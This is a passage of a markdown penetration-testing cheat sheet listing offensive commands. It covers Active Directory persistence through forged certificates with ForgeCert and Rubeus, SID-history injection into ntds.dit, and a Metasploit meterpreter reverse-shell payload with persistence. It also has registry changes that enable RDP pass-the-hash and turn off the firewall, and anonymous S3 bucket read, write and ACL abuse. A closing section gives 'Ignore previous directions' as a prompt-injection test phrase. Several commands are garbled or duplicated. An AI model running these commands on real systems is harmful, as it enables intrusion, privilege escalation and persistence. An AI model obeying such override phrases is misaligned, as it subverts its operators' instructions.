   - `ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123`
5. Use Rubeus to request a TGT using the certificate
   - `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`
6. Load the TGT to auth to DC, with mimikatz
   - `kerberos::ptt administrator.kirbi`


#### Trough SID History

- If you need to fix SID history (ntds.dit)
  https://github.com/MichaelGrafnetter/DSInternals
1. Confirm that your user has no SID history
   - `Get-ADUser <your ad username> -properties sidhistory,memberof`
2. Get the SID of the Domain Admins
   - `Get-ADGroup "Domain Admins"Get-ADGroup "Domain Admins"`
3. Patch the ntds.dit file with DSInternals
   - `Stop-Service -Name ntds -force`
   - `Stop-Service -Name ntds -force`
   - `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
   - `Start-Service -Name ntds`
   - `Restart-Service -Name NTDS`
4. Exit and Log in, verify the SID history
   - `Get-ADUser aaron.jones -Properties sidhistory`
5. Test your Admin privileges
   - `dir \\thmdc.za.tryhackme.loc\c$`
   
   
#### Trough metasploit

1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=445 -f exe -o shell.exe`
2. `use exploit/multi/handler`
3. `set payload windows/meterpreter/reverse_tcp`
4. after the shell is spawned: `background`
5. `use exploit/windows/local/persistence`
6. `set settion 1`
7. `run`
- If the session dies, just run again `run`
- https://docs.rapid7.com/metasploit/about-post-exploitation/



### <ins>Remote Desktop</ins>
```PowerShell
# enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

# enable RDP pass the hash
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" PropertyType DWORD -Force

# enable RDP and add user
reg add "HEY_LOCAL _MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" / fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\System \CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f netsh advfirewall set allprofiles state off
net localgroup "remote desktop users" <USER. NAME> / add
```


## Mobile

**FlappyBird_structure.apk**<br/>
├── **AndroidManifest.xml** meta-information about the app<br/>
├── **META-INF/** a manifest of metadata information<br/>
├── **classes.dex** contains the Java libraries that the application uses<br/>
├── **lib/** compiled native libraries used by the app<br/>
├── **res/** It can store resource files such as pictures, XML files, etc.<br/>
├── **assets/** application assets<br/>
└── **resources.arsc** contains compiled resources in a binary format

**Data storage** search for PII unencrypted in
- [ ] Phone system logs
- [ ] Webkit cache
- [ ] Dbs, plists, etc.
- [ ] Hardcoded in the binary

**Resources**
- [Mobile Application Penetration Testing Cheat Sheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
- [Mobile Hacking Cheatsheet](https://github.com/randorisec/MobileHackingCheatSheet)
- [OWASP Mobile Application Security](https://mas.owasp.org/)

**Download APKs**
- [m.apkpure.com](https://m.apkpure.com/it/)
- [apps.evozi.com](https://apps.evozi.com/apk-downloader/)
- [apk-dl.com](http://apk-dl.com/) 

**Emulators**
- [Noxplayer](https://www.bignox.com/)
- [Genymotion](https://www.genymotion.com/) an android emulator
- [Android Studio](https://developer.android.com/studio) Android application development, useful also for the emulator
  - Note: to start only the emulator, use commands such as
    ```cmd
    cd C:\Users\Riccardo\AppData\Local\Android\Sdk\emulator
    emulator -avd Pixel_4_XL_API_30
    ```

**Android tools**
- [adb](https://developer.android.com/studio/command-line/adb) it is used to debug an android device
- [frida](https://github.com/frida/frida/)
- [HTTP Toolkit](https://httptoolkit.tech/) to see requests on a non-rooted or emulated device
- [Java Decompiler](https://java-decompiler.github.io/)
- [dex2jar](https://github.com/pxb1988/dex2jar) decompile an .apk into .jar
- [jadx-gui](https://github.com/skylot/jadx/releases) another tool for producing Java source code from Android Dex and Apk files
- [apktool](https://ibotpeaches.github.io/Apktool/) to unpack an apk
- [APK-MITM](https://github.com/shroudedcode/apk-mitm) removes certificate pinning
- [Apkleak](https://github.com/dwisiswant0/apkleaks) to get endpoints from an apk	   
- [Frida](https://github.com/frida/frida)

### <ins>Missing Certificate and Public Key Pinning</ins>

Absence or improper implementation of certificate and public key pinning in a mobile app. This allows an attacker to potentially intercept communication by presenting fraudulent or unauthorized certificates, undermining the security of the system and enabling man-in-the-middle attacks.


### <ins>Cordova attacks</ins>

- Check for HTML injections
- Search for XSS
  - With this type of attack, it's possible to achieve an RCE. Check [this](https://www.joshmorony.com/why-xss-attacks-are-more-dangerous-for-capacitor-cordova-apps/) and [this](https://research.securitum.com/security-problems-of-apache-cordova-steal-the-entire-contents-of-the-phone_s-memory-card-with-one-xss/)


## Cloud hacking

**Resources**
- [cloud_metadata.txt](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b), Cloud Metadata Dictionary useful for SSRF Testing


### <ins>Abusing S3 Bucket Permissions</ins>

Target example: `http://[name_of_bucket].s3.amazonaws.com`

**Read Permission**

- `aws s3 ls s3://[name_of_bucket]  --no-sign-request`
- `aws s3 ls s3://pyx-pkgs --recursive --human-readable --summarize`

**Write Permission**

- `aws s3 cp localfile s3://[name_of_bucket]/test_file.txt –-no-sign-request`

**READ_ACP**

- `aws s3api get-bucket-acl --bucket [bucketname] --no-sign`
- `aws s3api get-object-acl --bucket [bucketname] --key index.html --no-sign-request`

**WRITE_ACP**

- `aws s3api put-bucket-acl --bucket [bucketname] [ACLPERMISSIONS] --no-sign-request`
- `aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] --no-sign-request`

**Tools**
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- [AWS CLI](https://aws.amazon.com/it/cli/)
- [S3Scanner](https://github.com/sa7mon/S3Scanner) A tool to find open S3 buckets and dump their contents
- [Cloud - AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
- [s3enum](https://github.com/koenrh/s3enum)
- To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).

**Resources**
- [Abusing S3 Bucket Permissions](https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/)
- [Amazon S3: Allows read and write access to objects in an S3 Bucket](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_rw-bucket.html)


### <ins>AWS Cognito</ins>

If you've found aws cognito client id and secret
1. `clientID:clientSercret` => `base64KEY`
2. `curl -X POST 'https://xx.amazoncognito.com/oauth2/token' \   -H 'Authorization: Basic base64KEY'\   -H 'Content-Type: application/x-www-form-urlencoded' \   -d 'grant_type=client_credentials'`
3. [Source](https://twitter.com/GodfatherOrwa/status/1670617783510376448)



### <ins>Google Cloud Storage bucket</ins>

**Tools**
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- https://github.com/RhinoSecurityLabs/GCPBucketBrute

**Resources**
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/



## Artificial intelligence vulnerabilities

### <ins>Prompt Injection</ins>

**Prompt Injection** is when an AI that follows textual instructions (a "prompt") to complete a job gets deceived by hostile, adversarial human input to do a task that was not its original goal. To test it, inject the text `Ignore previous directions`.

Some examples:
- ["Exploiting GPT-3 prompts with malicious inputs that order the model to ignore its previous directions"](https://twitter.com/goodside/status/1569128808308957185)
- ["OpenAI’s ChatGPT is susceptible to prompt injection — say the magic words, “Ignore previous directions”, and it will happily divulge to you OpenAI’s proprietary prompt"](https://twitter.com/goodside/status/1598253337400717313)
- [Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
- ["Prompt Injection Everywhere" by TakSec](https://github.com/TakSec/Prompt-Injection-Everywhere)
